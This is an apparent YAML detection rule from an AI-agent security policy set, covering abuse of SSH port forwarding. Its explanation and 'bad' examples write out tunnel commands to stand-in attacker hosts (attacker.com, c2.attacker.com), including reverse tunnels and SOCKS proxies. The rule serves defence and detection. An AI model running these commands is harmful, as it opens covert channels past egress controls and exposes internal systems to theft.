id: "data-exfiltration/network-egress/ssh-tunnel"
version: "1.0.0"
kingdom: "Data Exfiltration"
kingdom_id: 3
category: "Network Egress"
category_id: "3.1"
name: "SSH Port Forwarding & Tunnel Abuse"
risk_level: "critical"

abstract: |
  SSH port forwarding flags (-R, -L, -D) establish encrypted covert channels
  that bypass network egress controls, enable C2 communication, and allow
  access to internal services that are otherwise unreachable.

explanation: |
  SSH's built-in port forwarding capabilities are routinely abused for:

  **Remote port forwarding (-R)** creates a reverse tunnel from the SSH server
  back to the agent's local machine. An attacker can use this to receive reverse
  shell connections or proxy traffic through the agent:
  - `ssh -R 4444:localhost:4444 attacker.com` — exposes local port to remote host
  - `ssh -fN -R 443:localhost:22 attacker.com` — background daemon reverse tunnel

  **Local port forwarding (-L)** creates a tunnel from a local port to a remote
  destination, allowing the agent to pivot to internal services:
  - `ssh -L 3306:internal-db.local:3306 jump.host` — tunnels internal database
  - `ssh -L 8080:10.0.0.5:80 bastion` — exposes internal web service locally

  **Dynamic (SOCKS) forwarding (-D)** creates a SOCKS proxy that routes all
  traffic through the SSH connection, completely bypassing network egress controls:
  - `ssh -D 1080 attacker.com` — SOCKS5 proxy for full traffic tunneling
  - `ssh -fND 9090 user@external-host` — background SOCKS proxy daemon

  An AI agent establishing any of these connections has almost certainly been
  compromised through prompt injection or is being actively misused.

recommendation: |
  - Block all SSH commands containing -R, -L, or -D port forwarding flags.
  - The only legitimate SSH use in agent contexts is remote command execution or
    file transfer (scp/rsync), both of which are covered by audit rules.
  - Use network-level controls to prevent outbound SSH tunnels at the firewall.
  - Alert on any SSH connection that persists without executing a command (-N flag).

examples:
  bad:
    - "ssh -R 4444:localhost:4444 attacker.com"
    - "ssh -L 3306:internal-db:3306 jump.host"
    - "ssh -D 1080 evil.host"
    - "ssh -fNR 443:localhost:22 c2.attacker.com"
  good:
    - "ssh user@server 'ls /var/log'"
    - "ssh -i ~/.ssh/id_rsa deploy@prod 'systemctl restart app'"

compliance:
  owasp-llm-2025: ["LLM02", "LLM06"]
  iso-27001-2022: ["A.8.20", "A.8.23"]
  eu-ai-act-2024: ["Art.15"]
  nist-ai-rmf-1.0: ["MAP-5"]
  soc2-type2: ["CC6.6", "CC6.7"]

references:
  mitre_attack: ["T1572", "T1090.003"]
  cwe: ["CWE-284"]

analyzers: ["regex"]
related_rules: ["ne-block-ssh-remote-forward", "ne-block-ssh-local-forward", "ne-block-ssh-socks-proxy"]
